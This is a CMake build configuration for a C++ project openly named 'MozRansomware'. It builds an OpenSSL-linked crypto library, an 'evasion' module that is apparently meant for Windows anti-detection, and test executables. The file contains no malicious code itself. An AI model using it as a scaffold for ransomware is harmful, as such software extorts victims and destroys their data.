cmake_minimum_required(VERSION 3.14)
project(MozRansomware VERSION 2.0 LANGUAGES CXX)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_EXPORT_COMPILE_COMMANDS ON)

# Include directories
include_directories(${CMAKE_SOURCE_DIR}/include)

# Find OpenSSL
find_package(OpenSSL REQUIRED)

# Main crypto module
add_library(moz_crypto STATIC src/moz_crypto.cpp)
target_include_directories(moz_crypto PUBLIC ${CMAKE_SOURCE_DIR}/include)
target_link_libraries(moz_crypto OpenSSL::Crypto OpenSSL::SSL)

# Evasion module (Windows-specific APIs, stubs for other platforms)
add_library(moz_evasion STATIC src/moz_evasion.cpp)
target_include_directories(moz_evasion PUBLIC ${CMAKE_SOURCE_DIR}/include)
if(WIN32)
    target_link_libraries(moz_evasion)
else()
    target_link_libraries(moz_evasion)
endif()

# Create test executables
add_executable(moz_test tests/test_crypto.cpp)
target_link_libraries(moz_test moz_crypto moz_evasion OpenSSL::Crypto OpenSSL::SSL)

add_executable(moz_evasion_test tests/test_evasion.cpp)
target_link_libraries(moz_evasion_test moz_crypto moz_evasion OpenSSL::Crypto OpenSSL::SSL)
